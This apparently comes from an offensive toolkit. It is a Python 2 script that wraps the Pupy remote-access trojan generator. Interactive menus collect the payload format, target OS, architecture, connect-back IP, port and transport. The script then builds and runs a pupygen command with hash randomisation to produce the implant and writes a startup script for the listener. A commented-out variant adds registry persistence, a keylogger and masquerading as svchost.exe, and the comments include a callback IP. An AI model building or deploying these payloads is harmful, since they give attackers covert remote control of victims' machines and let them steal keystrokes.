#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen



format_Dict = {

    '1': 'client',
    '2': 'py',
    '3': 'pyinst',
    '4': 'py_oneliner',
    '5': 'ps1',
    '6': 'ps1_oneliner',
    '7': 'rubber_ducky'
    }

# New syntax format Pupy Generator is...
# python pupygen.py -f client -O windows --randomize-hash connect --host 52.53.180.45:443

format_List = [
    '\n\t1 Client',
    '2 Standalone Python *.py format',
    '3 Python pyinstaller wrapper file',
    '4 One-Liner HTTP Download-to-Memory Payload',
    '5 ps1 Powershell script, injects a pupy dll into a current process',
    '6 ps1 Remote Download Powershell-to-Pupy script',
    '7 Rubber Ducky Script and Injection binary file'
    ]
#

transport_Dict = {
    '1': 'obfs3',
    '2': 'udp',
    '3': 'http',
    '4': 'tcp_cleartext',
    '5': 'rsa',
    '6': 'ssl',
    '7': 'udp_cleartext',
    '8': 'scramblesuit',
    '9': 'ssl_rsa'
}
transport_List = [
    '\n\t1 obfs3',
    '2 udp',
    '3 http',
    '4 tcp_cleartext',
    '5 rsa',
    '6 ssl',
    '7 udp_cleartext',
    '8 scramblesuit',
    '9 ssl_rsa'
]

# New syntax format Pupy Generator is...
# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443

OS_Dict = {
    '1': 'windows',
    '2': 'linux',
    '3': 'android'
}

OS_List = [
    '\n\t#1. Windows Compatible Payload',
    '#2. Linux',
    '#3. Android'
]

Arch_Dict = {
    '1': 'x86',
    '2': 'x64'
}

Arch_List = [
    '\n\t#1. 32-bit',
    '#2. 64-bit'
]

# Ask user for type of payload
print ("\n\t".join(format_List))
payload_Type = str(raw_input("Enter a NUMBER for payload type: "))
Format_Chosen = format_Dict[payload_Type]

# Ask user for the type of OS they are targeting
print ("\n\t".join(OS_List))
OS_Type = str(raw_input("Enter a NUMBER for OPERATING SYSTEM: "))
Operating_System = OS_Dict[OS_Type]

print ("\n\t".join(Arch_List))
Arch_Type = str(raw_input("Enter a NUMBER for ARCHITECTURE: "))
Architecture_Value = Arch_Dict[Arch_Type]

host_Connectback = str(raw_input("Enter the IP address where the RAT will connect back to: "))

host_Port = str(raw_input("Enter the PORT of the IP address to connect back to: "))

print ("\n\t".join(transport_List))
Transport_Type = str(raw_input("Enter the TRANSPORT (PROTOCOL)"))
Transport_Chosen = transport_Dict[Transport_Type]

# root@Cylon-Basestar:~/pupy/pupy# python pupygen.py -f client -O windows -A x86 --randomize-hash connect --host 52.53.180.45:443
    # assigns all the file extension types
Format_Chosen = Format_Chosen

if Format_Chosen == 'py':
    file_extension = 'py'
if Format_Chosen == 'pyinst':
    file_extension = 'py'
if Format_Chosen == "ps1":
    file_extension = "ps1"
if Format_Chosen == "apk":
    file_extension = "apk"
# need to make separate command strings

if Operating_System == 'windows':
    file_extension = 'exe'
if Operating_System == "linux":
    file_extension = 'lin'
if Operating_System == "android":
    file_extension = 'apk'
    Format_Chosen = 'client'
if Format_Chosen == 'py':
    file_extension = 'py'
if Format_Chosen == 'pyinst':
    file_extension = 'py'
if Format_Chosen == "ps1":
    file_extension = "ps1"
cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
    Format_Chosen, # 0
    Operating_System, # 1
    Architecture_Value, #2
    Format_Chosen, #3
    Operating_System, # 4
    Architecture_Value, # 5
    Transport_Chosen, # 6
    file_extension, # 7
    host_Connectback, # 8
    host_Port, # 9
    Transport_Chosen # 10

    )
# if Format_Chosen != 'client': # if not equal client....
#     if Format_Chosen == 'apk':
#
#         Operating_System = 'android'
#         cmd_String = "python /root/pupy/pupy/pupygen.py -f {0} -s persistence,method=registry -s keylogger -s hide_argv,name=svchost.exe -s daemonize -O {1} -A {2} -o /root/ArmsCommander/payloads/tester/{3}_{4}_{5}_{6}.{7} --randomize-hash connect --host {8}:{9} -t {10}".format(
#             Format_Chosen, # 0
#             Operating_System, # 1
#             Architecture_Value, #2
#             Format_Chosen, #3
#             Operating_System, # 4
#             Architecture_Value, # 5
#             Transport_Chosen, # 6
#             file_extension, # 7
#             host_Connectback, # 8
#             host_Port, # 9
#             Transport_Chosen # 10
#
#         )
    # if Format_Chosen == 'py':
    #     file_extension = 'py'
    # if Format_Chosen == 'pyinst':
    #     file_extension = 'py'
    # if Format_Chosen == "ps1":
    #     file_extension = "ps1"
    # if Format_Chosen == "apk":
    #     file_extension = "apk"
print colored(cmd_String,'red','on_white')
os.system(cmd_String)
# payload_dir = '/root/ArmsCommander/payloads/'
tmp_dir = '/tmp'
os.chdir(tmp_dir)
cmd_String = 'cp -r pupy* /root/ArmsCommander/payloads/'
os.system(cmd_String)
print 'Payloads copied over to /root/ArmsCommander/payloads/ directory'
# print colored('Your payload is generated and is %s','red','on_white') % Format_Chosen
print colored('Your server that it is set to listen on is %s','red','on_white') % host_Connectback
print colored('Your port that the payload is to connect back to is %s','red','on_white') % host_Port
print 'Remember all of this when you are going to start up your listener, handle just as if it was a regular Metasploit listener'

# Autostart Script for Listener
# Generates a script file that will run Pupy Server with the correct parameters
pupy_installation_path = '/root/pupy/pupy'


# new bug, for the startup script it no longer works. Even though the syntax is the same. Must be manually started.
# configuration
# scramblesuit
# port 443

premade_startup_script_string = "sudo python /root/pupy/pupy/pupysh.py -t " + transport_Dict[Transport_Type] + ' -p ' + host_Port
premade_startup_script_location = "/root/ArmsCommander/payloads/pupy_server_startup.sh"
saved_startup_file = open(premade_startup_script_location, 'w')
saved_startup_file.write('cd ' + pupy_installation_path)
saved_startup_file.write('\n' + premade_startup_script_string)
saved_startup_file.close()

# Modifies file permissiosn in /root/ArmsCommander to allow the startup script to execute
os.system('chmod 777 /root/ArmsCommander/*')
print 'PREGENERATED SERVER STARTUP SCRIPT CREATED'
print 'Your startup script is located at: %s' % premade_startup_script_location
os.system('python /root/ArmsCommander/remoteexploits/Pupy_Menu.py')
